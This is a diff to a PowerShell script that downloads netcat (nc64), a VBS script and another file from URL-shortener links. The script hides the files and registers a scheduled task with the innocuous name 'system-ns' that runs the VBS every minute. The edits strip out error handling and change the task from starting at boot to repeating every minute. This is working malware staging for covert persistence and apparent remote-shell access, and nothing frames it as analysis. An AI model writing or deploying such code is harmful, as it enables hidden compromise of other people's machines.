@@ -20,12 +20,7 @@ if ($isAdmin) {
 
 # Create the installation directory if it doesn't exist
 if (-not (Test-Path $installPath)) {
-    try {
-        New-Item -ItemType Directory -Path $installPath -Force | Out-Null
-    } catch {
-        Write-Output "Failed to create directory: $_"
-        exit
-    }
+    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
 }
 
 # File download paths
@@ -38,41 +33,28 @@ $quietTxtUrl = "https://rb.gy/mx0i5"
 $nc64TxtUrl = "https://rb.gy/guty9"
 
 # Download files
-try {
-    Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
-    Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
-    Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath
-} catch {
-    Write-Output "Failed to download files: $_"
-    exit
-}
+Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
+Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
+Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath
 
 # Make the downloaded files hidden
+attrib +H $quietTxtPath
+attrib +H $nc64TxtPath
+attrib +H $scriptVbsPath
+
+# Create a scheduled task
+$action = New-ScheduledTaskAction -Execute $scriptVbsPath
+$trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(1)
+$trigger.Repetition = $(New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionDuration (New-TimeSpan -Hours 24) -RepetitionInterval (New-TimeSpan -Minutes 1)).Repetition
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
+
 try {
-    attrib +H $quietTxtPath
-    attrib +H $nc64TxtPath
-    attrib +H $scriptVbsPath
+    # Register the task
+    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "system-ns" -Settings $settings -Force
+
+    # Start the task immediately after registration
+    Start-ScheduledTask -TaskName "system-ns"
+
 } catch {
-    Write-Output "Failed to hide files: $_"
-    exit
-}
-
-# Create a scheduled task to run script.vbs at startup
-try {
-    $action = New-ScheduledTaskAction -Execute $scriptVbsPath
-    $trigger = New-ScheduledTaskTrigger -AtStartup
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
-
-    if ($isAdmin) {
-        # If admin rights, run as NT AUTHORITY\SYSTEM
-        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
-
-        # Register the task with SYSTEM account
-        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "system-ns" -Principal $principal -Settings $settings -Force
-    } else {
-        # If not admin, use your method to create the task
-        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "YourTaskName" -Settings $settings
-    }
-} catch {
-    Write-Output "Failed to register scheduled task: $_"
+    Write-Output "Failed to register or start the scheduled task: $_"
 }
